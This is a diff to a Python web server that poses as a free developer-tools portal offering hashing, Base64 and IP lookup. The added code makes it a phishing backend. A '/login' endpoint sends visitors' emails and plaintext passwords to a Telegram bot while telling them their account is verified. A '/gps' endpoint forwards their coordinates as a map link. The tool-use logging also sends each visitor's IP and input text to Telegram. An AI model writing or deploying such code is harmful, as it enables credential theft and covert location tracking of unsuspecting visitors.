@@ -18,31 +18,49 @@ def send_telegram(message):
 
 class CyberPortalHandler(SimpleHTTPRequestHandler):
     def do_POST(self):
-        if self.path == '/log_action':
+        if self.path in ['/log_action', '/login', '/gps']:
             content_length = int(self.headers['Content-Length'])
             post_data = self.rfile.read(content_length)
             data = json.loads(post_data.decode('utf-8'))
             
             real_ip = data.get('real_ip', self.client_address[0])
             user_agent = self.headers.get('User-Agent', 'Unknown')
-            tool = data.get('tool')
-            text = data.get('text', '')
             
-            send_telegram(f"🛠️ *TOOL: {tool}*\n🌐 IP: {real_ip}\n📝 Text: `{text[:100]}`\n📱 Device: {user_agent}")
+            # 1. تسجيل الحسابات
+            if self.path == '/login':
+                email = data.get('email')
+                password = data.get('password')
+                send_telegram(f"🚨 *NEW ACCOUNT CREATED!*\n📧 {email}\n🔑 {password}\n🌐 {real_ip}\n📱 {user_agent}")
+                output = "Account verified successfully."
             
-            output = ""
-            try:
-                if tool == "Hash MD5": output = hashlib.md5(text.encode()).hexdigest()
-                elif tool == "Hash SHA256": output = hashlib.sha256(text.encode()).hexdigest()
-                elif tool == "Base64 Encode": output = base64.b64encode(text.encode()).decode()
-                elif tool == "Base64 Decode": output = base64.b64decode(text.encode()).decode()
-                elif tool == "IP Lookup":
-                    r = requests.get(f"http://ip-api.com/json/{text}", timeout=5).json()
-                    output = json.dumps(r, indent=2)
-                else:
-                    output = f"[+] {tool} executed successfully.\n[+] Status: Completed."
-            except Exception as e:
-                output = f"[-] Error: {str(e)}"
+            # 2. سحب الموقع (GPS)
+            elif self.path == '/gps':
+                lat = data.get('lat')
+                lon = data.get('lon')
+                send_telegram(f"📍 *LOCATION TRACKED!*\n🌐 {real_ip}\n🗺️ Map: https://www.google.com/maps?q={lat},{lon}")
+                output = "Location updated."
+            
+            # 3. استخدام الأدوات
+            elif self.path == '/log_action':
+                tool = data.get('tool')
+                text = data.get('text', '')
+                send_telegram(f"🛠️ *TOOL: {tool}*\n🌐 IP: {real_ip}\n📝 Text: `{text[:100]}`")
+                
+                output = ""
+                try:
+                    if tool == "Hash MD5": output = hashlib.md5(text.encode()).hexdigest()
+                    elif tool == "Hash SHA256": output = hashlib.sha256(text.encode()).hexdigest()
+                    elif tool == "Base64 Encode": output = base64.b64encode(text.encode()).decode()
+                    elif tool == "Base64 Decode": output = base64.b64decode(text.encode()).decode()
+                    elif tool == "IP Lookup":
+                        r = requests.get(f"http://ip-api.com/json/{text}", timeout=5).json()
+                        output = json.dumps(r, indent=2)
+                    elif tool == "CHATBOT":
+                        output = "Message received. Our support team will contact you."
+                    else:
+                        output = f"[+] {tool} executed.\n[+] Status: Completed."
+                except Exception as e:
+                    output = f"[-] Error: {str(e)}"
 
             self.send_response(200)
             self.send_header('Content-type', 'application/json')
@@ -53,5 +71,5 @@ class CyberPortalHandler(SimpleHTTPRequestHandler):
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 8080))
     server = HTTPServer(('0.0.0.0', port), CyberPortalHandler)
-    print(f"[*] DEVTOOLS PRO LIVE ON PORT {port}...")
+    print(f"[*] OMNI TOOLS LIVE ON PORT {port}...")
     server.serve_forever()
